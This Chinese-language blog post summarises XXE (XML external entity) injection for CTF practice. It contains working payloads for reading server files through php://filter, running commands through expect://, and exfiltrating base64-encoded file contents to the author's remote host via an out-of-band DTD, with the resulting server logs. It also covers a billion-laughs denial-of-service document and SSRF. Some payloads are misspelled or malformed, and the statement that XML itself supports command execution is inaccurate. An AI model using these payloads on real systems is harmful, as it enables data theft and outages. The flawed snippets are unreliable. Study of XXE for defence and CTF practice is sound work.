---
title: XXE总结
tags:
  - 知识点总结
  - XXE
  - 外部实体注入
categories: 
  - 知识点总结
  - XXE
description: XXE Summary
excerpt: XXE Summary
abbrlink: 2874
date: 2022-02-27 14:16:58
---

## 什么是XXE

XXE即XML External Entity Injection，中文名为**XML外部实体注入**，与SQL注入类似，违反了数据与代码分离原则。

在开始讲解XXE之前，先来了解一下XML。

## XML基础知识

先来看一个基本的XML文档：

```xml-dtd
<!--XML声明部分-->
<?xml version="1.0"?>

<!--DTD 文档类型定义部分-->
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>

<!--文档元素-->
<note>
  <to>George</to>
  <from>John</from>
  <heading>Reminder</heading>
  <body>Don't forget the meeting!</body>
</note>
```

XML即可拓展标记语言，与HTML类似，可结构化地描述信息的一种标记语言，但是其语法要求比HTML严格。XML各部分的声明在上述代码中已经注释给出。

由于XXE漏洞与DTD文档部分密不可分，因此此处重点对DTD进行介绍。

### DTD

DTD即文档类型定义，可以定义合法的XML文档构建模块，使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML中(内部引用)，也可以作为外部引用。

1. 内部声明DTD：

   ```xml-dtd
   <!DOCTYPE 根元素 SYSTEM "文件名">
   ```

2. 引用外部DTD：

   ```xml-dtd
   <!DOCTYPE 根元素 SYSTEM "文件名">
   ```

DTD文档中有很多重要的关键字如下：

* DOCTYPE - DTD的声明
* ENTITY - 实体的声明
* SYSTEM、PUBLIC - 外部资源声明

### 实体

在XML中，可以简单地将实体解释为变量，实体必须在DTD中声明，可以在文档的其它位置引用，实体分为以下四类：

* 内置实体

* 字符实体

* 通用实体

* 参数实体(声明时必须使用`%`声明，其余实体用`&`声明)

  ```xml-dtd
  <!ENTITY % 实体名称 "实体的值">
  <!-- 或者 -->
  <!ENTITY % 实体名称 SYSTEM "URI">
  ```

按照引用方式可以分为：

* 内部实体

  ```xml-dtd
  <!ENTITY 实体名称 "实体的值">
  ```

* 外部实体

  ```xml-dtd
  <!ENTITY 实体名称 SYSTEM "URI">
  ```

而外部实体可以利用的协议如下：

| libxml2 |      PHP       |   Java   | .NET  |
| :-----: | :------------: | :------: | :---: |
|  file   |      file      |   http   | file  |
|  http   |      http      |  https   | http  |
|   ftp   |      ftp       |   ftp    | https |
|         |      php       |   file   |  ftp  |
|         | compress.zlib  |   jar    |       |
|         | compress.bzip2 |  netdoc  |       |
|         |      data      |  mailto  |       |
|         |      glob      | gopher * |       |
|         |      pahr      |          |       |

## XXE的利用

XXE又分为以下两类：

* 有回显注入
* 无回显注入

### 有回显注入

#### 文件读取

其中有回显注入较为简单，例如在PHP中，如果后端对输入的XML进行了解析并且返回其中某个信息，我们能就可以利用该注入读取文件：

```xml-dtd
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE xxe[
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "php://filter/read=conver.base64-encode/resouce=index.php">]>
<root>
<name>&xxe;</name>
</root>
```

注意，如果服务器解析了该XML文档并且返回了其中的name字段的话，那么此时我们将得到index.php的文件内容(Base64编码)。

#### 命令执行

当然，利用该XXE我们也可以进行命令执行，这是因为XML是支持进行命令执行的，例如我们想知道此时系统是以哪个用户在运行Web程序，我们可以利用XXE，请求XML文档为：

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe[
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "expect://whoami">]>
<root>
<name>&xxe;</name>
</root>
```

### 无回显注入

对于XXE而言，带有回显的情况十分少见，XML文档一般只是作为数据传输载体将数据提交给服务器，Web应用在处理获取数据后，返回其中某个字段的可能性很低，因此我们需要另一种方式来获取敏感信息。

以一题CTF题为例，其登录时发送的请求包为XML格式的数据，请求如下：

```xml
<user><username>admin</username><password>admin</password></user>
```

经测试也无回显，于是这个时候需要考虑使用另一种方式获取敏感信息，注意到XML支持HTTP、File协议，于是我们考虑使用外部实体注入，同时为了控制注入参数并且判断页面到底能否解析外部实体，我们将DTD实体放到远程VPS上。

先在VPS上创建一个dtd文件，内容如下：

```xml-dtd
<!ENTITY % all
    "<!ENTITY &#x25; send SYSTEM 'http://blog.evalexp.ml/?data=%file;'>"
>
%all;
```

然后考虑XML Payload：

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE updateProfile [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./flag.php">
    <!ENTITY % dtd SYSTEM "https://blog.evalexp.ml/evil.dtd">
    %dtd;
    %send;
]>

<user><username>admin</username><password>admin</password>
```

接下来看该Payload，我们先声明一个实体，为**file**，该时读取了flag.php的内容并进行Base64编码(防止URL编码中丢失数据)。

接下来声明了另一个实体**dtd**，dtd的内容为VPS上的dtd文件，在该dtd文件中声明了一个实体**all**，其内容为一个声明字符串，声明了实体**send**，在字符串中的实体声明注意编码。

接下来我们先是引用了**dtd**实体，这就使得远程**dtd**文件被包含进来了，从而声明了实体**send**，此时再引用了**send**实体，这将会把**file**的实体内容发送到我们的VPS上。

样例数据：

```http
108.162.215.8 - - [28/May/2021:15:39:21 +0000] "GET /evil.dtd HTTP/1.1" 200 96 "-" "-"
172.69.35.33 - - [28/May/2021:15:39:24 +0000] "GET /?data=PD9waHANCiRmbGFnPSJjdW10Y3Rme3h4M19pc19WZVJ5X0U0c1l9IjsNCj9waHA+ HTTP/1.1" 200 5198 "-" "-"
```

在能外带信息的基础上，其实也和回显型差不多的利用方式了。

### 关于XXE的DOS攻击

大家提起XXE很容易忽略的一个事情，XXE能否造成DOS攻击，回答是肯定的。

由于它可以引用实体，从而使得XML内容指数型扩增，来考虑一个XML文档：

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol
;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&
lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&
lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&
lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&
lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&
lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&
lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&
lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&
lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

我们从下往上看，可以看到文档内容引用了实体**lol9**，而**lol9**的实体声明为：

```xml-dtd
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&
lol8;&lol8;&lol8;">
```

即引用了10个**lol8**实体，而**lol8**也引用了10个**lol7**实体，以上过程不断展开，一个XML文件(小于1K)实际上占用了3000M字节的内存，这将造成DOS攻击。

除了上面的XML炸弹，在linux上，我们还可以使用无尽随机字节流来让程序一直加载外部实体，这将不会使得程序结束，从而产生DOS攻击：

```xml-dtd
<!ENTITY bomb "file:///dev/random" >]><msg>&bomb;</msg>
```

### 关于XXE的SSRF利用

在上面的无回显注入时，提到了使用远程DTD文件，引入该文件进行数据回传，进而获取敏感信息。

因为XML支持大部分协议，我们也可以利用XXE进行SSRF攻击，探测内网端口、探测内网服务，进行其内网测绘，或者攻击内网的App。

而这应该才是XXE漏洞最重要的利用方式之一。

